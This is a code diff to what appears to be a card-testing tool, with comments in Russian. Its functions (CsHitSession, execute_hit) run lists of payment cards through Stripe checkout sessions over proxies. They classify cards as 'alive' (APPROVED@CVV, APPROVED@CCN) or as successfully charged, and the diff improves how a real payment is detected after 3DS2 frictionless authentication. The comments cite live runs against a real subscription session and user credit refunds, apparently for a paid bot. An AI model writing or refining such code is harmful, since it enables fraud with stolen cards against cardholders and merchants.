@@ -601,9 +601,21 @@ class CsHitSession:
                         self.s, self.pk, self.cs, sdk_payload, country_code=target_cc
                     )
                     outcome = f_res.get("outcome")
+                    evidence = str(f_res.get("evidence") or "")
                     if outcome == "FRICTIONLESS_PASSED":
-                        _log.log_stripe("FRICTIONLESS", self.cs[:14], "PASSED", f"{self.amount}{self.currency}")
-                        return "APPROVED@PAID", f"3DS2 frictionless passed ({self.amount}{self.currency})"
+                        # Прошла аутентификация и оплачено — разные вещи. Живой замер 2026-09-12: ветка
+                        # объявляла APPROVED@PAID на аутентификации, а сессия оставалась unpaid.
+                        # Оплатой считается только подтверждение Stripe: сессия complete или PI succeeded,
+                        # а processing — деньги в пути (PI_PENDING).
+                        _log.log_stripe("FRICTIONLESS", self.cs[:14], evidence or "PASSED",
+                                        f"{self.amount}{self.currency}")
+                        if evidence in ("session_complete", "pi_succeeded"):
+                            return "APPROVED@PAID", (f"3DS2 frictionless + подтверждение Stripe "
+                                                     f"({evidence}, {self.amount}{self.currency})")
+                        if evidence == "pi_processing":
+                            return "PI_PENDING", "3DS2 frictionless, PI processing (деньги в пути)"
+                        return "3DS_FRICTIONLESS", (f"3DS2 frictionless passed ({self.amount}{self.currency}) — "
+                                                    f"аутентификация, не оплата; ждём подтверждения сессии")
                     elif outcome == "CHALLENGE_REQUIRED":
                         _log.log_stripe("FRICTIONLESS", self.cs[:14], "CHALLENGE", "issuer requires OTP")
                         return "3DS_CHALLENGE", "3DS2 challenge (transStatus=C, enrolled)"
@@ -860,15 +872,23 @@ async def execute_hit(target_url: str, cards: list, proxy: str | None = None,
     # status — только класс таксономии (его читают бот и CLI), состояние прогона — pipeline.
     # Раньше сюда писались SUCCESS/COMPLETED: через coerce_verdict они становились UNKNOWN,
     # то есть без возврата кредита (аудит 2026-09, G-10).
+    # Итоговый статус — тот класс, который вернула поверхность. Раньше любой APPROVED* (включая
+    # APPROVED@CVV и APPROVED@CCN — «карта жива», а не «оплачено») превращался в APPROVED@PAID,
+    # и прогон на живой подписочной сессии отрапортовал победу при payment_status=unpaid
+    # (живой замер 2026-09-12). Теперь «оплачено» — только фактическое подтверждение сессии.
     if terminal_hit:
-        final_status = "APPROVED@PAID"
+        card_status = str(terminal_hit.get("status") or "")
+        final_status = card_status if card_status in config.VERDICTS else config.coerce_verdict(card_status)
+        paid = final_status == "APPROVED@PAID"
     else:
         final_status = config.coerce_verdict(str((results[-1].get("status") if results else "") or "ERROR"))
+        paid = False
     last_pipeline = "SUCCESS" if terminal_hit else ("COMPLETED" if results else "FAILED")
     return {
         "status": final_status,
         "pipeline": last_pipeline,
         "viable": True,
+        "paid": paid,
         "pi_id": gs.pi_id,
         "amount_cents": gs.amount,
         "currency": gs.currency,
